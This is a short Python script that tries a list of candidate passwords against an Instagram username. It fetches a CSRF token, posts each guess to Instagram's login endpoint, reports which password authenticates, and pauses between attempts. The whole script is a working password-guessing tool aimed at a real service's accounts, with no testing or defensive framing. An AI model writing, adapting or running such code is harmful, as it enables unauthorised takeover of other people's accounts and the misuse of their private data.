import requests
import time

def login_instagram(username, passwords):
    session = requests.Session()
    
    try:
        # Initial request to get CSRF token
        response = session.get('https://www.instagram.com/')
        csrf_token = response.cookies['csrftoken']

        for password in passwords:
            # Prepare login data
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }
            headers = {
                'X-CSRFToken': csrf_token,
                'referer': 'https://www.instagram.com/accounts/login/'
            }

            # Send login request
            response = session.post('https://www.instagram.com/accounts/login/ajax/', data=login_data, headers=headers)
            response_data = response.json()

            # Check login response
            if response_data.get('authenticated') and response_data['authenticated'] is True:
                print(f"Password '{password}' is correct.")
                break
            elif response_data.get('message'):
                print(f"Attempt with password '{password}' failed: {response_data['message']}")
            else:
                print(f"Attempt with password '{password}' failed.")

            # Introduce a delay between login attempts
            time.sleep(2)
    
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    
    finally:
        session.close()

if __name__ == "__main__":
    username = input("Enter Instagram username: ")
    passwords = input("Enter three passwords separated by commas: ").split(',')
    
    login_instagram(username, passwords)
